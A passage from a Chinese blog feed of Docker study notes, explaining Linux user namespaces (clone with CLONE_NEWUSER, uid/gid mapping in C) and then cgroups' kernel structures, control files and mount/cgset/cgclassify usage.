<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">           CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWIPC </div><div class="line">           | CLONE_NEWUTS | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>执行的效果就如同PID namespace一节中“挂载proc文件系统”的执行结果，区别就是退出mount namespace以后，root namespace的文件系统不会被破坏</p>
<h4 id="User-namespaces"><a href="#User-namespaces" class="headerlink" title="User namespaces"></a><b>User namespaces</b></h4><p>User namespace主要隔离了安全相关的标识符（identifiers）和属性（attributes），包括用户ID、用户组ID、root目录、key（指密钥）以及特殊权限。说得通俗一点，一个普通用户的进程通过clone()创建的新进程在新user namespace中可以拥有不同的用户和用户组。这意味着一个进程在容器外属于一个没有特权的普通用户，但是他创建的容器进程却属于拥有所有权限的超级用户，这个技术为容器提供了极大的自由。<br>User namespace是目前的六个namespace中最后一个支持的，并且直到Linux内核3.8版本的时候还未完全实现。因为user namespace实际上并不算完全成熟，很多发行版担心安全问题，在编译内核的时候并未开启USER_NS。实际上目前Docker也还不支持user namespace，但是预留了相应接口。所以在进行接下来的实验时，请确保系统的Linux内核版本高于3.8并且内核编译时开启了USER_NS。<br>Linux中，特权用户的user ID就是0，演示的最终我们将看到user ID非0的进程启动user namespace后user ID可以变为0。使用user namespace的方法跟别的namespace相同，即调用clone()或unshare()时加入CLONE_NEWUSER标识位。<br>修改代码并另存为userns.c，为了看到用户权限(Capabilities)，可能你还需要安装一下libcap-dev包。<br>首先包含以下头文件以调用Capabilities包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#include &lt;sys/capability.h&gt;</div></pre></td></tr></table></figure>
<p>其次在子进程函数中加入geteuid()和getegid()得到namespace内部的user ID，其次通过cap_get_proc()得到当前进程的用户拥有的权限，并通过cap_to_text（）输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int child_main(void* args) &#123;</div><div class="line">        printf(&quot;在子进程中!\n&quot;);</div><div class="line">        cap_t caps;</div><div class="line">        printf(&quot;eUID = %ld;  eGID = %ld;  &quot;,</div><div class="line">                        (long) geteuid(), (long) getegid());</div><div class="line">        caps = cap_get_proc();</div><div class="line">        printf(&quot;capabilities: %s\n&quot;, cap_to_text(caps, NULL));</div><div class="line">        execv(child_args[0], child_args);</div><div class="line">        return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在主函数的clone()调用中加入我们熟悉的标识符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">            CLONE_NEWUSER | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>在编译之前先查看一下当前用户的uid和guid，请注意此时是普通用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ id -u</div><div class="line">1000</div><div class="line">$ id -g</div><div class="line">1000</div></pre></td></tr></table></figure>
<p>然后开始编译运行，并进行新建的user namespace，会发现shell提示符前的用户名已经变为nobody</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc userns.c -Wall -lcap -o userns.o &amp;&amp; ./userns.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">eUID = 65534;  eGID = 65534;  capabilities: = cap_chown,cap_dac_override,[...]37+ep  &lt;&lt;--</div></pre></td></tr></table></figure>
<p>通过验证可以得到以下信息。<br>user namespace被创建后，第一个进程被赋予了该namespace中的全部权限，这样这个init进程就可以完成所有必要的初始化工作，而不会因权限不足而出现错误。</p>
<p>我们看到namespace内部看到的UID和GID已经与外部不同了，默认显示为65534，表示尚未与外部namespace用户映射。我们需要对user namespace内部的这个初始user和其外部namespace某个用户建立映射，这样可以保证当涉及到一些对外部namespace的操作时，系统可以检验其权限（比如发送一个信号或操作某个文件）。同样用户组也要建立映射。<br>还有一点虽然不能从输出中看出来，但是值得注意。用户在新namespace中有全部权限，但是他在创建他的父namespace中不含任何权限。就算调用和创建他的进程有全部权限也是如此。所以哪怕是root用户调用了clone()在user namespace中创建出的新用户在外部也没有任何权限。<br>最后，user namespace的创建其实是一个层层嵌套的树状结构。最上层的根节点就是root namespace，新创建的每个user namespace都有一个父节点user namespace以及零个或多个子节点user namespace，这一点与PID namespace非常相似。<br>通过在/proc/[pid]/uid_map和/proc/[pid]/gid_map两个文件中写入对应的绑定信息可以实现这一点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ID-inside-ns   ID-outside-ns   length</div></pre></td></tr></table></figure>
<p>写这两个文件需要注意以下几点。<br>这两个文件只允许由拥有该user namespace中CAP_SETUID权限的进程写入一次，不允许修改。<br>写入的进程必须是该user namespace的父namespace或者子namespace。<br>第一个字段ID-inside-ns表示新建的user namespace中对应的user/group ID，第二个字段ID-outside-ns表示namespace外部映射的user/group ID。最后一个字段表示映射范围，通常填1，表示只映射一个，如果填大于1的值，则按顺序建立一一映射</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">void set_uid_map(pid_t pid, int inside_id, int outside_id, int length) &#123;</div><div class="line">    char path[256];</div><div class="line">    sprintf(path, &quot;/proc/%d/uid_map&quot;, getpid());</div><div class="line">    FILE* uid_map = fopen(path, &quot;w&quot;);</div><div class="line">    fprintf(uid_map, &quot;%d %d %d&quot;, inside_id, outside_id, length);</div><div class="line">    fclose(uid_map);</div><div class="line">&#125;</div><div class="line">void set_gid_map(pid_t pid, int inside_id, int outside_id, int length) &#123;</div><div class="line">    char path[256];</div><div class="line">    sprintf(path, &quot;/proc/%d/gid_map&quot;, getpid());</div><div class="line">    FILE* gid_map = fopen(path, &quot;w&quot;);</div><div class="line">    fprintf(gid_map, &quot;%d %d %d&quot;, inside_id, outside_id, length);</div><div class="line">    fclose(gid_map);</div><div class="line">&#125;</div><div class="line">int child_main(void* args) &#123;</div><div class="line">    cap_t caps;</div><div class="line">    printf(&quot;在子进程中!\n&quot;);</div><div class="line">    set_uid_map(getpid(), 0, 1000, 1);</div><div class="line">    set_gid_map(getpid(), 0, 1000, 1);</div><div class="line">    printf(&quot;eUID = %ld;  eGID = %ld;  &quot;,</div><div class="line">            (long) geteuid(), (long) getegid());</div><div class="line">    caps = cap_get_proc();</div><div class="line">    printf(&quot;capabilities: %s\n&quot;, cap_to_text(caps, NULL));</div><div class="line">    execv(child_args[0], child_args);</div><div class="line">    return 1;</div><div class="line">&#125;</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>编译后即可看到user已经变成了root</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc userns.c -Wall -lcap -o usernc.o &amp;&amp; ./usernc.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">eUID = 0;  eGID = 0;  capabilities: = [...],37+ep</div></pre></td></tr></table></figure>
<p>至此已经完成了绑定的工作，可以看到演示全程都是在普通用户下执行的。最终实现了在user namespace中成为了root而对应到外面的是一个uid为1000的普通用户。<br>如果要把user namespace与其他namespace混合使用，那么依旧需要root权限。解决方案可以是先以普通用户身份创建user namespace，然后在新建的namespace中作为root再clone()进程加入其他类型的namespace隔离。<br>虽然Docker目前尚未使用user namespace，但是他用到了user namespace中的Capabilities机制。<br>从内核2.2版本开始，Linux把原来和超级用户相关的高级权限划分成为不同的单元，称为Capability。这样管理员就可以独立对特定的Capability进行使能或禁止。Docker虽然没有使用user namespace，但是他可以禁用容器中不需要的Capability，一次在一定程度上加强容器安全性</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><b>总结</b></h4><p>虽然namespace技术使用起来非常简单，但是要真正把容器做到安全易用却并非易事。PID namespace中，要实现一个完善的init进程来维护好所有进程；network namespace中，还有复杂的路由表和iptables规则没有配置；user namespace中还有很多权限上的问题需要考虑等等。其中有些方面Docker已经做的很好，有些方面也才刚刚开始</p>
<p>ref </p>
<p><a href="http://70data.net/1165.html" target="_blank" rel="external">Docker学习笔记（四）Linux namespace</a><br><a href="http://coolshell.cn/articles/17010.html" target="_blank" rel="external">Docker基础技术：Linux Namespace（上）</a><br><a href="http://blog.csdn.net/liumiaocn/article/details/52549595" target="_blank" rel="external">Docker基础: Linux内核命名空间之（3）net namespace</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux Namespace是Linux提供的一种内核级别环境隔离的方法,它有如下分类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mount-提供磁盘挂载点和文件系统的隔离能力&lt;/li&gt;
&lt;li&gt;ipc-提供进程间通信的隔离能力，用来隔离System V IPC标识以及Posix消息队
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker学习笔记之Linux cgroups</title>
    <link href="https://t1ger.github.io/2016/11/25/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BLinux-cgroups/"/>
    <id>https://t1ger.github.io/2016/11/25/docker学习笔记之Linux-cgroups/</id>
    <published>2016-11-25T06:50:26.000Z</published>
    <updated>2016-11-25T10:31:49.561Z</updated>
    
    <content type="html"><![CDATA[<h4 id="cgroup是什么"><a href="#cgroup是什么" class="headerlink" title="cgroup是什么"></a><b>cgroup是什么</b></h4><p>Linux CGroup全称Linux Control Group,Linux内核的一个功能,用来限制、控制与分离一个进程组群的资源(如CPU、内存、磁盘输入输出等),它最初叫Process Container,由Google工程师(Paul Menage和Rohit Seth)于2006年提出,后来因为Container有多重含义容易引起误解,就在2007年更名为Control Groups,并被整合进Linux内核2.6.24。<br>通俗的来说,cgroups可以限制、记录、隔离进程组所使用的物理资源,为容器实现虚拟化提供了基本保证,是构建Docker等一系列虚拟化管理工具的基石</p>
<p>本质上来说,cgroups是内核附加在程序上的一系列钩子(hooks),通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的<br>对开发者来说,cgroups有如下四个有趣的特点：</p>
<ul>
<li>cgroups的API以一个伪文件系统的方式实现,即用户可以通过文件操作实现cgroups的组织管理</li>
<li>cgroups的组织管理操作单元可以细粒度到线程级别,用户态代码也可以针对系统分配的资源创建和销毁cgroups,从而实现资源再分配和管理</li>
<li>所有资源管理的功能都以“subsystem(子系统)”的方式实现,接口统一</li>
<li>子进程创建之初与其父进程处于同一个cgroups的控制组</li>
</ul>
<h4 id="cgroup的功能"><a href="#cgroup的功能" class="headerlink" title="cgroup的功能"></a><b>cgroup的功能</b></h4><p>cgroups提供了以下四个功能</p>
<ul>
<li>资源限制(Resource Limitation):对进程组使用的资源总额进行限制<br>假如设置了内存上限,一旦超过配额就发出OOM(out of memory)</li>
<li>优先级分配(Prioritization):通过分配cpu的时间片数据及磁盘io带宽大学,进而控制了进程运行的优先级</li>
<li>资源统计(Accounting):统计系统资源使用量,比如统计cpu时长,内存用量,可用于计费功能</li>
<li>进程控制(Control):可以对进程组执行挂起、恢复等操作</li>
</ul>
<p>备注:有一段时间,内核开发者甚至把namespace也作为一个cgroups的subsystem加入进来,也就是说cgroups曾经甚至还包含了资源隔离的能力。但是资源隔离会给cgroups带来许多问题,如PID在循环出现的时候cgroup却出现了命名冲突、cgroup创建后进入新的namespace导致脱离了控制等等,所以在2011年就被移除了</p>
<p>在实践中，SA一般会利用cgroup做下面这些事：</p>
<ul>
<li>隔离一个进程集合（比如：nginx的所有进程），并限制他们所消费的资源</li>
<li>为这组进程 分配其足够使用的内存</li>
<li>为这组进程分配相应的网络带宽和磁盘存储限制</li>
<li>限制访问某些设备(通过设置设备的白名单)</li>
</ul>
<h4 id="组织结构和规则"><a href="#组织结构和规则" class="headerlink" title="组织结构和规则"></a><b>组织结构和规则</b></h4><p>在传统Unix进程管理,实际上是先启动init进程作为根节点,再由init节点创建子进程作为子节点,而每个子节点由可以创建新的子节点,如此往复,形成一个树状结构<br>cgroup也是类似的树状结构,子节点也从父节点继承属性<br>区别在于,cgroup构成的hierarchy可以允许存在多个,如果进程模型是由init作为根节点构成的一棵树的话,那么cgroups的模型则是由多个hierarchy构成的森林。原因在于,如果只有一个hierarchy,那么所有的task都要受到绑定其上的subsystem的限制,会给那些不需要这些限制的task造成麻烦</p>
<ul>
<li>规则1:同一个hierarchy可以附加一个或多个subsystem,cpu和memory的subsystem附加到了一个hierarchy</li>
<li>规则2:一个subsystem可以附加到多个hierarchy,当且仅当这些hierarchy只有这唯一一个subsystem</li>
<li>规则3:系统每次新建一个hierarchy时,该系统上的所有task默认构成了这个新建的hierarchy的初始化cgroup,这个cgroup也称为root cgroup。对于你创建的每个hierarchy,task只能存在于其中一个cgroup中,即一个task不能存在于同一个hierarchy的不同cgroup中,但是一个task可以存在在不同hierarchy中的多个cgroup中。如果操作时把一个task添加到同一个hierarchy中的另一个cgroup中,则会从第一个cgroup中移除</li>
<li>规则4:进程（task）在fork自身时创建的子任务(child task)默认与原task在同一个cgroup中,但是child task允许被移动到不同的cgroup中。即fork完成后,父子进程间是完全独立的</li>
</ul>
<h4 id="cgroup工作原理和实现方式"><a href="#cgroup工作原理和实现方式" class="headerlink" title="cgroup工作原理和实现方式"></a><b>cgroup工作原理和实现方式</b></h4><ul>
<li>cgroup实现结构讲解<br>cgroup的实现本质上是给系统进程挂上钩子(hooks),当task运行的过程中涉及到某个资源时就会触发钩子上所附带的subsystem进行检测,最终根据资源类别的不同使用对应的技术进行资源限制和优先级分配</li>
</ul>
<p>Linux中管理task进程的数据结构为task_struct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#ifdef CONFIG_CGROUPS </div><div class="line">/* Control Group info protected by css_set_lock */ </div><div class="line">struct css_set *cgroups; </div><div class="line">/* cg_list protected by css_set_lock and tsk-&gt;alloc_lock */ </div><div class="line">struct list_head cg_list; </div><div class="line">#endif</div><div class="line">struct css_set &#123; </div><div class="line">atomic_t refcount;</div><div class="line">struct hlist_node hlist; </div><div class="line">struct list_head tasks; </div><div class="line">struct list_head cg_links; </div><div class="line">struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT]; </div><div class="line">struct rcu_head rcu_head; </div><div class="line">&#125;;</div><div class="line">struct cgroup_subsys_state &#123; </div><div class="line">struct cgroup *cgroup; </div><div class="line">atomic_t refcnt; </div><div class="line">unsigned long flags; </div><div class="line">struct css_id *id; </div><div class="line">&#125;;</div><div class="line">struct cgroup &#123; </div><div class="line">unsigned long flags; </div><div class="line">atomic_t count; </div><div class="line">struct list_head sibling; </div><div class="line">struct list_head children; </div><div class="line">struct cgroup *parent; </div><div class="line">struct dentry *dentry; </div><div class="line">struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT]; </div><div class="line">struct cgroupfs_root *root;</div><div class="line">struct cgroup *top_cgroup; </div><div class="line">struct list_head css_sets; </div><div class="line">struct list_head release_list; </div><div class="line">struct list_head pidlists;</div><div class="line">struct mutex pidlist_mutex; </div><div class="line">struct rcu_head rcu_head; </div><div class="line">struct list_head event_list; </div><div class="line">spinlock_t event_list_lock; </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>在task_struct中,与cgroup相关的字段主要有两个,一个是css_set *cgroups,表示指向css_set（包含进程相关的cgroups信息）的指针,一个task只对应一个css_set结构,但是一个css_set可以被多个task使用。另一个字段是list_head cg_list,是一个链表的头指针,这个链表包含了所有的链到同一个css_set的task进程。每个css_set结构中都包含了一个指向cgroup_subsys_state(包含进程与一个特定子系统相关的信息)的指针数组。cgroup_subsys_state则指向了cgroup结构(包含一个cgroup的所有信息),通过这种方式间接的把一个进程和cgroup联系了起来</p>
<p>另一方面,cgroup结构体中有一个list_head css_sets字段,它是一个头指针,指向由cg_cgroup_link（包含cgroup与task之间多对多关系的信息）形成的链表。由此获得的每一个cg_cgroup_link都包含了一个指向css_set *cg字段,指向了每一个task的css_set。css_set结构中则包含tasks头指针,指向所有链到此css_set的task进程构成的链表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct cg_cgroup_link &#123; </div><div class="line">struct list_head cgrp_link_list; </div><div class="line">struct cgroup *cgrp; </div><div class="line">struct list_head cg_link_list; </div><div class="line">struct css_set *cg; &#125;;</div></pre></td></tr></table></figure>
<p>css_set中也有指向所有cg_cgroup_link构成链表的头指针,通过这种方式也能定位到所有的cgroup</p>
<p>为什么要使用cg_cgroup_link结构体呢？<br>因为task与cgroup之间是多对多的关系。在数据库中,如果两张表是多对多的关系,那么如果不加入第三张关系表,就必须为一个字段的不同添加许多行记录,导致大量冗余。通过从主表和副表各拿一个主键新建一张关系表,可以提高数据查询的灵活性和效率。而一个task可能处于不同的cgroup,只要这些cgroup在不同的hierarchy中,并且每个hierarchy挂载的子系统不同:另一方面,一个cgroup中可以有多个task,这是显而易见的,但是这些task因为可能还存在在别的cgroup中,所以它们对应的css_set也不尽相同,所以一个cgroup也可以对应多个·css_set。在系统运行之初,内核的主函数就会对root cgroups和css_set进行初始化,每次task进行fork/exit时,都会附加（attach）/分离（detach）对应的css_set。综上所述,添加cg_cgroup_link主要是出于性能方面的考虑,一是节省了task_struct结构体占用的内存,二是提升了进程fork()/exit()的速度</p>
<p>当task从一个cgroup中移动到另一个时,它会得到一个新的css_set指针。如果所要加入的cgroup与现有的cgroup子系统相同,那么就重复使用现有的css_set,否则就分配一个新css_set。所有的css_set通过一个哈希表进行存放和查询,hlist_node hlist就指向了css_set_table这个hash表。同时,为了让cgroups便于用户理解和使用,也为了用精简的内核代码为cgroup提供熟悉的权限和命名空间管理,内核开发者们按照Linux 虚拟文件系统转换器（VFS：Virtual Filesystem Switch）的接口实现了一套名为cgroup的文件系统,非常巧妙地用来表示cgroups的hierarchy概念,把各个subsystem的实现都封装到文件系统的各项操作中。定义子系统的结构体是cgroup_subsys,cgroup_subsys中定义了一组函数的接口,让各个子系统自己去实现,类似的思想还被用在了cgroup_subsys_state中,cgroup_subsys_state并没有定义控制信息,只是定义了各个子系统都需要用到的公共信息,由各个子系统各自按需去定义自己的控制信息结构体,最终在自定义的结构体中把cgroup_subsys_state包含进去,然后内核通过container_of等宏定义来获取对应的结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">struct cgroup_subsys &#123; </div><div class="line">struct cgroup_subsys_state *(*create)(struct cgroup_subsys *ss, </div><div class="line">struct cgroup *cgrp); </div><div class="line">int (*pre_destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">int (*can_attach)(struct cgroup_subsys *ss,</div><div class="line"> struct cgroup *cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*cancel_attach)(struct cgroup_subsys *ss, </div><div class="line">struct cgroup *cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*attach)(struct cgroup_subsys *ss, struct cgroup *cgrp, </div><div class="line">struct cgroup *old_cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*fork)(struct cgroup_subsys *ss, struct task_struct *task); </div><div class="line">void (*exit)(struct cgroup_subsys *ss, struct task_struct *task); </div><div class="line">int (*populate)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*post_clone)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*bind)(struct cgroup_subsys *ss, struct cgroup *root);</div><div class="line">int subsys_id; </div><div class="line">int active; </div><div class="line">int disabled; </div><div class="line">int early_init; </div><div class="line">bool use_id; </div><div class="line">#define MAX_CGROUP_TYPE_NAMELEN 32 </div><div class="line">const char *name; </div><div class="line">struct mutex hierarchy_mutex; </div><div class="line">struct lock_class_key subsys_key; </div><div class="line">struct cgroupfs_root *root; </div><div class="line">struct list_head sibling; </div><div class="line">struct idr idr; </div><div class="line">spinlock_t id_lock; </div><div class="line">struct module *module; </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ul>
<li>基于cgroups实现结构的用户层体现</li>
</ul>
<p>在实际使用时,需要通过挂载（mount）cgroup文件系统新建一个层级结构,挂载时指定要绑定的子系统,缺省情况下默认绑定系统所有子系统。把cgroup文件系统挂载（mount）上以后,你就可以像操作文件一样对cgroups的hierarchy层级进行浏览和操作管理,包括权限管理、子文件管理等等。除了cgroup文件系统以外,内核没有为cgroups的访问和操作添加任何系统调用。如果新建的层级结构要绑定的子系统与目前已经存在的层级结构完全相同,那么新的挂载会重用原来已经存在的那一套（指向相同的css_set）。否则如果要绑定的子系统已经被别的层级绑定,就会返回挂载失败的错误。如果一切顺利,挂载完成后层级就被激活并与相应子系统关联起来,可以开始使用了</p>
<p>目前无法将一个新的子系统绑定到激活的层级上,或者从一个激活的层级中解除某个子系统的绑定。<br>当一个顶层的cgroup文件系统被卸载（umount）时,如果其中创建后代cgroup目录,那么就算上层的cgroup被卸载了,层级也是激活状态,其后代cgoup中的配置依旧有效。只有递归式的卸载层级中的所有cgoup,那个层级才会被真正删除</p>
<p>层级激活后,/proc目录下的每个task PID文件夹下都会新添加一个名为cgroup的文件,列出task所在的层级,对其进行控制的子系统及对应cgroup文件系统的路径。<br>一个cgroup创建完成,不管绑定了何种子系统,其目录下都会生成以下几个文件,用来描述cgroup的相应信息。同样,把相应信息写入这些配置文件就可以生效,内容如下：<br>tasks：这个文件中罗列了所有在该cgroup中task的PID。该文件并不保证task的PID有序,把一个task的PID写到这个文件中就意味着把这个task加入这个cgroup中。<br>cgroup.procs：这个文件罗列所有在该cgroup中的线程组ID。该文件并不保证线程组ID有序和无重复。写一个线程组ID到这个文件就意味着把这个组中所有的线程加到这个cgroup中。<br>notify_on_release：填0或1,表示是否在cgroup中最后一个task退出时通知运行release agent,默认情况下是0,表示不运行。<br>release_agent：指定release agent执行脚本的文件路径,该文件在最顶层cgroup目录中存在,在这个脚本通常用于自动化umount无用的cgroup</p>
<p>除了上述几个通用的文件以外,绑定特定子系统的目录下也会有其他的文件进行子系统的参数配置。在创建的hierarchy中创建文件夹,就类似于fork中一个后代cgroup,后代cgroup中默认继承原有cgroup中的配置属性,但是你可以根据需求对配置参数进行调整。这样就把一个大的cgroup系统分割成一个个嵌套的、可动态变化的“软分区”</p>
<h4 id="cgroup的使用方法简介"><a href="#cgroup的使用方法简介" class="headerlink" title="cgroup的使用方法简介"></a><b>cgroup的使用方法简介</b></h4><ul>
<li><p>安装cgroups工具库<br>安装的过程会自动创建/cgroup目录,如果没有自动创建也不用担心,使用mkdir /cgroup 手动创建即可<br>安装完成后,你就可以使用lssubsys,默认的cgroup配置文件为/etc/cgconfig.conf,但是因为存在使LXC无法运行的bug,所以在新版本中把这个配置移除了</p>
</li>
<li><p>查询cgroup及子系统挂载状态<br>在挂载子系统之前,可能你要先检查下目前子系统的挂载状态,如果子系统已经挂载,你就无法把子系统挂载到新的hierarchy,此时就需要先删除相应hierarchy或卸载对应子系统后再挂载。<br>查看所有的cgroup：lscgroup<br>查看所有支持的子系统：lssubsys -a<br>查看所有子系统挂载的位置： lssubsys –m<br>查看单个子系统挂载位置：lssubsys –m memory（以memory为例）</p>
</li>
<li>创建hierarchy层级并挂载子系统<br>使用cgroup的最佳方式是为想要管理的每个或每组资源创建单独的cgroup层级结构。而创建hierarchy并不神秘,实际上就是做一个标记,通过挂载一个tmpfs文件系统,并给一个好的名字就可以了</li>
</ul>
<p>系统默认挂载的cgroup就会进行如下操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -t tmpfs cgroups /sys/fs/cgroup</div></pre></td></tr></table></figure>
<p>挂载完成tmpfs后就可以通过mkdir命令创建相应的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure></p>
<p>再把子系统挂载到相应层级上,挂载子系统也使用mount命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -t cgroup -o subsystems name /cgroup/name</div></pre></td></tr></table></figure></p>
<p>name是层级名称。具体我们以挂载cpu和memory的子系统为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount –t cgroup –o cpu,memory cpu_and_mem /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure></p>
<p>从mount命令开始,-t后面跟的是挂载的文件系统类型,即cgroup文件系统。-o后面跟要挂载的子系统种类如cpu、memory,用逗号隔开,其后的cpu_and_mem不被cgroup代码的解释,但会出现在/proc/mounts里,可以使用任何有用的标识字符串。最后的参数则表示挂载点的目录位置</p>
<ul>
<li>卸载cgroup<br>cgroup文件系统虽然支持重新挂载,但是官方不建议使用,重新挂载虽然可以改变绑定的子系统和release agent,但是它要求对应的hierarchy是空的并且release_agent会被传统的fsnotify（内核默认的文件系统通知）代替,这就导致重新挂载很难生效。可以通过卸载,再挂载的方式处理这样的需求</li>
</ul>
<p>卸载cgroup非常简单,你可以通过cgdelete命令,也可以通过rmdir</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rmdir /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure>
<p>rmdir执行成功的必要条件是cg1下层没有创建其它cgroup,cg1中没有添加任何task,并且它也没有被别的cgroup所引用。<br>cgdelete cpu,memory:/ 使用cgdelete命令可以递归的删除cgroup及其命令下的后代cgroup,并且如果cgroup中有task,那么task会自动移到上一层没有被删除的cgroup中,如果所有的cgroup都被删除了,那task就不被cgroups控制。但是一旦再次创建一个新的cgroup,所有进程都会被放进新的cgroup中</p>
<ul>
<li>设置cgroups参数<br>设置cgroups参数非常简单,直接对之前创建的cgroup对应文件夹下的文件写入即可。<br>设置task允许使用的cpu为0和1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 0-1 &gt; /sys/fs/cgroup/cg1/cpuset.cpus</div></pre></td></tr></table></figure>
<p>使用cgset命令也可以进行参数设置,对应上述允许使用0和1cpu</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgset -r cpuset.cpus=0-1 cpu,memory:/</div></pre></td></tr></table></figure>
<ul>
<li>添加task到cgroup<br>通过文件操作进行添加<br>echo [PID] &gt; /path/to/cgroup/tasks<br>上述命令就是把进程ID打印到tasks中,如果tasks文件中已经有进程,需要使用”&gt;&gt;”向后添加。<br>通过cgclassify将进程添加到cgroup</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgclassify -g subsystems:path_to_cgroup pidlist</div></pre></td></tr></table></figure>
<p>这个命令中,subsystems指的就是子系统(如果使用man命令查看,可能也会使用controllers表示)​​​,如果mount了多个,就是用”,”隔开的子系统名字作为名称,类似cgset命令。<br>通过cgexec直接在cgroup中启动并执行进程</p>
